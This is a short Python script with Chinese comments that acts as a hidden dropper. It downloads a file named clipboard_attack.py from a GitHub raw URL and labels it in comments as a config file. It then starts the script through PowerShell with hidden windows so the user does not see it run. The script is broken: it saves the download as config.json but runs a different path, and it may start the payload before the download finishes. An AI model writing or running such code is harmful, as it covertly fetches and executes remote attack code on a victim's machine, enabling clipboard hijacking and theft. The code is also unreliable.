import requests
import os
import subprocess
from threading import Thread

def download_config(url, save_path):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        # 确保目标文件夹存在
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        
        # 直接写入文件
        with open(save_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
        return True
    except:
        return False

def on_button_click(config_url, save_path):
    # 启动后台下载线程
    thread = Thread(target=download_config, args=(config_url, save_path))
    thread.daemon = True
    thread.start()

def run_silent_script():
    # 下载脚本并运行
    config_url = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"  # 配置文件下载链接
    save_path = "C:/Users/Admin/config.json"  # 配置文件保存路径
    on_button_click(config_url, save_path)
    
    # 运行 Python 脚本（静默模式）
    subprocess.Popen(
        ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', 
         'Start-Process python -ArgumentList "C:/Users/Admin/clipboard_attack.py" -WindowStyle Hidden -NoNewWindow'],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if __name__ == "__main__":
    run_silent_script()

